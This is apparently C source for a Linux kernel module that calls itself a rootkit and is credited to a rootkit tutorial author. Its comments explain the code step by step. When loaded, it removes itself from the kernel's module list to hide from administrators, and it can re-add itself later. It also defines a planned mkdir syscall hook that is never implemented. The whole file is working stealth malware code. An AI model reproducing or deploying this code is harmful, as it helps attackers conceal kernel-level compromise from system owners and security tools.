#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#define HIDE_MODULE 1
#define SYSCALL_HOOK 1
#define SYSCALL_HOOK_TO "mkdir"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Began Bajrami");
MODULE_DESCRIPTION("IRM-C");
MODULE_VERSION("0.01");

/*
 * credits goes to: xcellerator
 */

#if HIDE_MODULE == 1
/* list_head is a doubly-linked list structure used by the kernel
 * It's got a .prev and .next field, but we can use the list_del()
 * and list_add() functions add/remove items from a list_head struct.
 * The only thing to keep in mind is that we need to keep a local copy
 * of the item that we remove so we can add it back later when we're done.
 */
static struct list_head *prev_module;
static short hidden = 0;

void showme(void) {
  /* Add the saved list_head struct back to the module list */
  list_add(&THIS_MODULE->list, prev_module);
  hidden = 0;
}

void hideme(void) {
  /* Save the module in the list before us, so we can add ourselves
   * back to the list in the same place later. */
  prev_module = THIS_MODULE->list.prev;
  /* Remove ourselves from the list module list */
  list_del(&THIS_MODULE->list);
  hidden = 1;
}

#endif

static int __init rootkit_init(void) {
  printk(KERN_INFO "hey! i'm just a chill module.\n");
#if HIDE_MODULE == 1
  printk(KERN_INFO "let me hide myself...\n");
  hideme();
#endif
  return 0;
}

static void __exit rootkit_exit(void) {
  /* Note that you won't be able to unload this LKM yet... */
  printk(KERN_INFO "How did you find me?\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
